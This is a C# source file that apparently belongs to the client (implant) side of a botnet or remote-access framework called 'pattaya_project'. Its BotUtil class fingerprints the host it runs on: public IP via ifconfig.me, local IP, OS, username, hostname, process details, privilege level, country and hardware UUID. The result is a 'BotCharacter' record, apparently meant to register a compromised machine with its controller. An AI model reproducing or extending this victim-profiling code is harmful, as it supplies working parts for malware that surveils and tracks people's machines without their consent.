using pattaya_project_client.Models;
using System;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Management;
using System.Net;
using System.Net.Sockets;
using System.Security.Principal;


namespace pattaya_project_client.Utils
{
    public static class BotUtil
    {
        public static BotCharacter GenerateChracter()
        {
            var process = Process.GetCurrentProcess();
            var identity = WindowsIdentity.GetCurrent();
            var principal = new WindowsPrincipal(identity);

            var integrity = "Medium";

            if (identity.IsSystem)
            {
                integrity = "SYSTEM";
            }
            else if (principal.IsInRole(WindowsBuiltInRole.Administrator))
            {
                integrity = "High";
            }

            var botCharacter = new BotCharacter
            {
                WanIp = GetPublicIpAddress(),
                LanIp = GetLocalIPAddress(),
                Os = System.Runtime.InteropServices.RuntimeInformation.OSDescription,
                Username = identity.Name,
                Hostname = Environment.MachineName,
                ProcessName = process.ProcessName,
                ProcessId = process.Id,
                Integrity = integrity,
                Architecture = IntPtr.Size == 8 ? "x64" : "x86",
                Country = RegionInfo.CurrentRegion.TwoLetterISORegionName,
                HWID = GetHardwareId().Replace("-","")
            };

            process.Dispose();
            identity.Dispose();

            return botCharacter;
        }



        private static string GetLocalIPAddress()
        {
            var host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (var ip in host.AddressList)
            {
                if (ip.AddressFamily == AddressFamily.InterNetwork)
                {
                    return ip.ToString();
                }
            }
            return "0.0.0.0";
        }


        private static string GetPublicIpAddress()
        {
            var request = (HttpWebRequest)WebRequest.Create("http://ifconfig.me");

            request.UserAgent = "curl";

            string publicIPAddress;

            request.Method = "GET";
            using (WebResponse response = request.GetResponse())
            {
                using (var reader = new StreamReader(response.GetResponseStream()))
                {
                    publicIPAddress = reader.ReadToEnd();
                }
            }

            return publicIPAddress.Replace("\n", "");
        }

        private static string GetHardwareId()
        {
            string hardwareId = string.Empty;
            ManagementClass mc = new ManagementClass("Win32_ComputerSystemProduct");
            ManagementObjectCollection moc = mc.GetInstances();

            foreach (ManagementObject mo in moc)
            {
                hardwareId = mo.Properties["UUID"].Value.ToString();
                break;
            }

            return hardwareId;
        }
    }
}
